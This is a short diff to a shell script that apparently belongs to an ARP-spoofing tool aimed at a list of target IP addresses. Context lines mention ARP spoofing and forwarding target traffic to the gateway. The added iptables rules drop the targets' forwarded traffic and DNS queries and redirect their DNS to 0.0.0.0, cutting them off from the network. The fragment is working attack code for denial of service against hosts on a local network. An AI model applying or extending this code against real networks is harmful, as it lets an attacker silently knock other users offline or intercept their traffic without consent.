@@ -40,6 +40,14 @@ for TARGET in $TARGET_IPS; do
         iptables -A FORWARD -d "$TARGET" -j DROP
         iptables -t nat -A PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"
 
+        # DNS Blocking Rules
+        iptables -A FORWARD -s "$TARGET" -p udp --dport 53 -j DROP
+        iptables -A FORWARD -s "$TARGET" -p tcp --dport 53 -j DROP
+        iptables -A FORWARD -d "$TARGET" -p udp --sport 53 -j DROP
+        iptables -A FORWARD -d "$TARGET" -p tcp --sport 53 -j DROP
+        iptables -t nat -A PREROUTING -s "$TARGET" -p udp --dport 53 -j DNAT --to-destination 0.0.0.0
+        iptables -t nat -A PREROUTING -s "$TARGET" -p tcp --dport 53 -j DNAT --to-destination 0.0.0.0
+        
         # Expand subnet for ARP spoofing
         read HOSTMIN HOSTMAX < <(expand_subnet "$TARGET")
         if [[ -n "$HOSTMIN" && -n "$HOSTMAX" ]]; then
